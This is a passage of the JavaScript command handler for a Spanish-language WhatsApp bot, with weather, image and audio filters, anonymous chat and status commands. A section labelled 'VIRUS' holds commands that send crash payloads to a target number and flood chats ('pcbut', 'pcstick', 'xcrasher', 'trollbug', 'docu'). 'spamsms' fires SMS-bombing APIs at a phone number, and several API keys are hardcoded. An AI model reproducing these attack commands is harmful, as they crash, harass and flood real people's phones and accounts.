      `https://api.openweathermap.org/data/2.5/weather?q=${args}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`
    )
    const res = await response
    const name = res.data.name
    const Country = res.data.sys.country
    const Weather = res.data.weather[0].description
    const Temperature = res.data.main.temp + "°C"
    const Minimum_Temperature = res.data.main.temp_min + "°C"
    const Maximum_Temperature = res.data.main.temp_max + "°C"
    const Humidity = res.data.main.humidity + "%"
    const Wind = res.data.wind.speed + "km/h"
    const wea = `*📍LUGAR:* ${name}\n*PAÍS:* ${Country}\n*TIEMPO:* ${Weather}\n*TEMPERATURA:* ${Temperature}\nTEMPERATURA MÍNIMA: ${Minimum_Temperature}\n*📛TEMPERATURA MÁXIMA:* ${Maximum_Temperature}\n*HUMEDAD:* ${Humidity}\n*VIENTO:* ${Wind}
  `

    reply(wea)
  } catch (e) {
    return "Ubicación de error no encontrada!!!"
  }
break


//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 EDITOR - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
case 'jail': case 'pixelate': case 'blur': case 'imagesketch': case 'triggeredwebp': case 'shit': case 'burn': case 'invert': case 'wanted': case 'rip': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
	            if (!/image/.test(mime)) return reply(`*Enviar/responder imagen con leyenda* ${prefix + command}`)
	            	        sticWait(from)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await simple.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/${command}?url=${anu}`)
                simple.sendMessage(m.chat, { image: buf, caption: `by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'viewfinder': case 'angie': case 'aria': case 'attic': case 'black-and-white': case 'chrome-1970': case 'contrast-bandw': case 'duotone': case 'eva': case 'golden-hour': case 'japanese': case 'sphinx': case 'light-leak': case 'movie':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
	            if (!/image/.test(mime)) return reply(`*Enviar/responder imagen con leyenda* ${prefix + command}`)
	            	        sticWait(from)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await simple.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://api.violetics.pw/api/photofilter/${command}?apikey=beta&image=${anu}`)
                simple.sendMessage(m.chat, { image: buf, caption: `by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
            case 'secretmsj':
			case 'secreto':
			case 'mensajesecreto':
			case 'sendsecret': {
				if (m.isGroup) throw mess.private
				if (!text) return m.reply(`*Cómo utilizar*\n\nEnviar pedidos ${prefix}${command} número|remitente|mensaje\n\nEjemplo ${prefix}${command} 593xxxxxxx|esto es un seudónimo sí|estoy enamorado de ti\n\nEjemplo 2 : ${prefix}${command} 593xxxxxxx|anonimo|estoy enamorado de ti\n\nNo te preocupes, la privacidad está a salvo.><`)
				let numero = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let mensaje = q.split('|')[2] ? q.split('|')[2] : ''
				if (mensaje.length < 1) return m.reply(`¡Todo debe ser llenado! ej: secretmsj 593xxxxxxxx|anónimo|Hola`)
				let buttons = [
                    { buttonId: `Owner`, buttonText: { displayText: '⌲ Mi Creador' }, type: 1 },
                    { buttonId: `confirmsecret ${m.sender}`, buttonText: { displayText: '⌲ Confirmar Mensaje' }, type: 1 },
                    { buttonId: `secreto`, buttonText: { displayText: '⌲ Enviar Mensaje Secreto' }, type: 1 }
                ]
			simple.sendMessage(`${numero}@s.whatsapp.net`, { text:`MENSAJE SECRETO\n\nHola, hay un Mensaje Anónimo aquí!!\n─────────────\n*Simple-Bot*\n─────────────\n\nDe : _${saking}_ \nMensaje : _${mensaje}_`, title: 'MENSAJE SECRETO DETECTADO', footer: 'Ciee alguien envió un mensaje aquí\n© 2022 Crls^', buttons: buttons, headerType: 5 })
				m.reply(`Envío exitoso de Mensaje secreto!!`)
				}
				break
			case 'confirmsecret': {
 				 simple.sendMessage(q, { text: `Se ha confirmado, la lectura del mensaje🤭` })
				  m.reply(`Mensaje secreto confirmado con exito!.`)
				  }
				break
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Editor de audios + cmds- Bot_™ ❞|═══════════════════════════════════════════⬡|//	
 case "tts":  case "texttospeech":  case "say": case "speak":{
    if (!args[0]) return reply("Por favor, dame un texto para que pueda hablarlo.!")
      
      let texttosay = text
        ? text
        : m.quoted && m.quoted.text
        ? m.quoted.text
        : m.text;
      const SpeakEngine = require("google-tts-api"); 
      const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "es", slow: false, host: "https://translate.google.com",});
      simple.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `SimpleSpeechEngine.mp3`,},{quoted: m,});
    }
    break
		   		   case 'bass': case 'blown': case 'deep': case 'saturado': case 'fast': case 'fat': case 'nightcore': case 'reversa': case 'robot': case 'lento': case 'suave': case 'ardilla':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/saturado/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reversa/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/lento/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/suave/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/ardilla/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                sticWait(from)
                let media = await simple.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                simple.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Responda al audio que desea cambiar con el título *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Sin hashes`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'No tiene permiso para eliminar este comando de sticker'              
                delete global.db.data.sticker[hash]
                m.reply(`listo!`)
            }
            break
            case 'listcmd': {
                let teks = `
*Lista Hash*
Info: *bold* hash está bloqueado
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                simple.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Responde mensaje!'
                if (!m.quoted.fileSha256) throw 'SHA256 Falta hash'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash no se encuentra en la base de datos'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('listo!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Responde al mensaje que desea guardar en la base de datos'
                if (!text) throw `Ejemplo : ${prefix + command} nombre file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' se ha incluido en la lista de mensajes`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Se ha agregado correctamente un mensaje en la lista de mensajes como '${text}'
    
Acceso con ${prefix}getmsg ${text}

Ver la lista Mensaje con ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Ejemplo : ${prefix + command} nombre file\n\nVer una lista de mensajes con ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' no aparece en la lista de mensajes`
                simple.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LISTA DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Nombre :* ${i.nama}\n⬡ *Tipo :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' no aparece en la lista de mensajes`)
		delete msgs[text.toLowerCase()]
		m.reply(`Eliminado correctamente '${text}' de la lista de mensajes`)
            }
	    break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Chat anónimo ™ ❞|═══════════════════════════════════════════⬡|//	
	    case 'anonymous': {
                if (m.isGroup) return reply('Las características no se pueden usar para grupos!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'Start', buttonText: { displayText: 'Empezar' }, type: 1 }
                ]
                simple.sendButtonText(m.chat, buttons, `\`\`\`Hola ${await simple.getName(m.sender)} Bienvenido al chat anónimo\n\nHaga clic en el botón de abajo para encontrar un socio\`\`\``, simple.user.name, m)
            }
			break
            case 'salirc': case 'leave': {
                if (m.isGroup) return reply('Las características no se pueden usar para grupos!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Empezar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `\`\`\`No estás en una sesión anónima, presiona el botón para encontrar pareja \`\`\``)
                   reply(false)
                }
                reply('Ok')
                let other = room.other(m.sender)
                if (other) await simple.sendText(other, `\`\`\`El socio ha abandonado la sesión anónima\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'empezarc': case 'start': {
                if (m.isGroup) return reply('Las características no se pueden usar para grupos!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'fuerac', buttonText: { displayText: 'Parar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `\`\`\`Todavía está en una sesión anónima, presione el botón de abajo para finalizar su sesión anónima\`\`\``, simple.user.name, m)
                    reply(false)
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Siguiente' }, type: 1 },
                        { buttonId: 'salirc', buttonText: { displayText: 'Parar' }, type: 1 }
                    ]
                    await simple.sendButtonText(room.a, buttons, `\`\`\`Socio encontrado con éxito, ahora puede enviar un mensaje\`\`\``, simple.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await simple.sendButtonText(room.b, buttons, `\`\`\`Socio encontrado con éxito, ahora puede enviar un mensaje\`\`\``, simple.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'salirc', buttonText: { displayText: 'Parar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `\`\`\`Por favor, espere, buscando un socio\`\`\``, simple.user.name, m)
                }
                break
            }
            case 'next': case 'siguientec': {
                if (m.isGroup) return reply('Las características no se pueden usar para grupos!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Empezar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `\`\`\`No estás en una sesión anónima, presiona el botón para encontrar pareja\`\`\``)
                    reply(false)
                }
                let other = romeo.other(m.sender)
                if (other) await simple.sendText(other, `\`\`\`El socio ha abandonado la sesión anónima\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Siguiente' }, type: 1 },
                        { buttonId: 'salirc', buttonText: { displayText: 'Parar' }, type: 1 }
                    ]
                    await simple.sendButtonText(room.a, buttons, `\`\`\`Socio encontrado con éxito, ahora puede enviar un mensaje\`\`\``, simple.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await simple.sendButtonText(room.b, buttons, `\`\`\`Socio encontrado con éxito, ahora puede enviar un mensaje\`\`\``, simple.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'salirc', buttonText: { displayText: 'Parar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `\`\`\`Por favor, espere, buscando un socio\`\`\``, simple.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                simple.public = true
                m.reply('Cambio exitoso al uso público')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                simple.public = false
                m.reply('Cambio exitoso al uso propio')
            }
            break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 ping and owner™ ❞|═══════════════════════════════════════════⬡|//	
            break
            case 'ping':
            case 'botstatus':
            case 'statusbot':
            case 'infobot': {
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
txtping = `*⍢⃝🤖 I N F O  B O T*\n\n
*👤 Owner Name :* ${global.ownername}\n
*🕊️ Bot Name :* ${global.botname}\n
*🔗 Owner Number :* wa.me/${global.owner}\n\n
*⍢⃝👾 I N F O  M A N A G E R*\n\n
*🗃️ Lib :* Baileys Multi Device\n
*🆎 Tipe :* Nodejs\n
*📈 STATUS BOT :* ONLINE\n
*⚡ Speed :* ${latensi.toFixed(4)} Second\n
*⏰ Runtime :* ${runtime(process.uptime())}\n
*💻 RAM Server :* ${formatp(os.totalmem() - os.freemem())}/${formatp(os.totalmem())}\n\n
*⍢⃝🤝 A P O Y A  M I S  R E D E S*\n\n
*🎗️ Github :* https://github.com/CarlosTwT\n
*🎗️ Instagram :* https://instagram.com/c4rl0s_9e\n
*🎗️ Tiktok :* https://tiktok.com/theprivmen\n
   `.trim()
                m.reply(txtping)
                     }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Os Release:* ${os.release()}
ᴏꜱ tipo:*   ${os.type()}
directorio:*  ${os.homedir()}
plataforma :* ${os.platform()} 
memoria free:* ${os.freemem()}
memoria total:* ${os.totalmem()}
versión:* ${os.version()}
dispositivo :* ${os.hostname()}
 
Velocidad de respuesta ${latensi.toFixed(4)} _Segundos_ \n ${oldd - neww} _milisegundos_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_memoria usada NodeJS_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Uso total de cpu_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testeando velocidad...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'runtime': {
const templateMessage = {
text: '*Tiempo de actividad👀*',footer: `${runtime(process.uptime())}`,
templateButtons: [
{
index: 1, 
urlButton: {
displayText: 'Instagram', 
url: `${instagram}`
}
},
],
}
const sendm = simple.sendMessage(from, templateMessage)
}
break
case 'latencia': {
let timestamp = speed()
let latensi = speed() - timestamp
const templateMessage = {
text: '*Latencia 🧞*',footer: `${latensi.toFixed(4)} segundos`,
templateButtons: [
{
index: 1, 
urlButton: {
displayText: 'Sigueme!', 
url: `${instagram}`
}
},
],
}
const sendm = simple.sendMessage(from, templateMessage)
}
break
            case 'owner': case 'creator': {
                simple.sendContact(m.chat, global.owner, fkontak)
const templateMessage = {
text: 'Mi señor, mi dueño',footer: `© ${ownername}`,
templateButtons: [
{
index: 1, 
urlButton: {
displayText: 'Instagram', 
url: `${instagram}`
}
},
],
}
const sendm = simple.sendMessage(from, templateMessage)
            }
            break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 VIRUS™ ❞|═══════════════════════════════════════════⬡|//	
case 'pcbut':
                if (!isCreator) return reply(`${mess.owner}`)
                    if (!text) return reply(`Coloca el número del objetivo\nEjemplo: ${prefix}pcbut 593xxxxxxxxxx`)
                 buttonvirus = [
                          {buttonId: 'simple', buttonText: {displayText: simplevirtex}, type: 1},
  {buttonId: 'simple', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'simple', buttonText: {displayText: ngazap}, type: 1}
]
                    buttonMsgX = {
                          text: author,
                          footerText: botname,
                          buttons: buttonvirus,
                          headerType: 1
                      }
                      simple.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
                      reply(mess.success)
                    break
case 'pcstick':{
                if (!isCreator) return reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nEjem: ${prefix}pcstick 593xxxxxxxxx`)
SimpleMD = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 StickerFt = fs.readFileSync('./media/webp/stvirus.webp')
simple.sendImageAsSticker(`${text}@s.whatsapp.net`, StickerFt, SimpleMD, { packname: global.packname, author: global.author })
await reply(`Etiqueta de error atacada con éxito ${text}@s.whatsapp.net`)
}
break
case 'pcvn':{
                if (!isCreator) return replay(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nEjem: ${prefix}pcvn 593xxxxxxxxxx`)
SimpleVn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 Vn = fs.readFileSync('./media/audio/loli.mp3')
 simple.sendMessage(`${text}@s.whatsapp.net`, {audio: Vn, mimetype: 'audio/mpeg', ptt:true }, {quoted: SimpleVn})
await reply(`El error atacó con éxito el número ${text}@s.whatsapp.net`)
}
break
case 'xcrasher':{
                if (!isCreator) return reply(`${mess.owner}`)
                if (!m.isGroup) return reply(mess.group)
if (args.length == 0) return reply(`Use ${prefix+command} Monto\nejemplo: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
txts = '``SIMPLE MD``',
simple.sendMessage(m.chat, {text: txts, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${virtex}`,body: '💤💤',previewType:"PHOTO",thumbnail: thumb,sourceUrl:ig}}})
}
}
break
case 'trollbug': {            
                if (!isCreator) return reply(`${mess.owner}`)
                if (!m.isGroup) return reply(mess.group)
             trolo = `${ngazap(prefix)}
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
`
             faketrol = { 
                    key: { 
                        fromme: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remotejid: "" }) 
                    }, 
                    message: { 
                        "imagemessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `SimpleBot`,
                            "jpegthumbnail": thumb
                        } 
                    } 
                }
            await simple.sendmessage(m.chat, {text:trolo},{quoted:faketrol})
            await simple.sendmessage(m.chat, {text:trolo},{quoted:faketrol})
            await simple.sendmessage(m.chat, {text:trolo},{quoted:faketrol})
            await simple.sendmessage(m.chat, {text:trolo},{quoted:faketrol})
            await simple.sendmessage(m.chat, {text:trolo},{quoted:faketrol})
            }
            break 
case 'poll': {
if (!isCreator) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "Hola soy SimpleBot",
"options": [
	{
"optionName": "test"
	},
	{
"optionName": "test"
	},
	{
"optionName": "test"
	},
	{
"optionName": "test"
	},
	{
"optionName": "<3 tqm"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
simple.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
reply('envio exitoso')
}
break
            case 'spamsms':{
                if (args.length > 2) return reply(`Cómo utilizar : ${command} numero`)
   
  
                try {
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=85faf717d0545d14074659ad&nomor=${args[1]}`)
                    reply("Listo")
               } catch (err) {
                            simple.sendMessage(global.owner, `${command} Error:` + err)
                            reply(mess.error)
               }
                }
                break
case "blockspam": //russo and chefin
if (!isCreator) return simple.sendMessage(from, {text: 'solo yo puedo usar esto'})
if (!q) return simple.sendMessage(from, {text: 'Donde es la cantidad mn? 🤷‍♂�?'})
for (let i = `${q}`;i !== 0; i -=1){
simple.updateBlockStatus(from, "block")
simple.updateBlockStatus(from, "unblock")
}
break
449756950375
	       case 'catalog': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/catalog.jpg') }, { upload: simple.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": m.message.imageMessage,
"productId": "5760420690656714",
"title": `© Simple•MD`,
"description": `© Simple•MD${ngazap(prefix)}`,
"jpegThumbnail": thumb,
"currencyCode": "IDR",
"footerText": `© Simple•MD${ngazap(prefix)}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© Simple•MD NO SOMOS MAESTROS${ngazap(prefix)}`,
"url": "wa.me/593991398786"
},
"businessOwnerJid": "593991398786@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
simple.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'docu': {
if (!isCreator) return
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 simpleMODS ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗${ngazap(prefix)}`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
simple.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bugtod': {
if (!isCreator) return
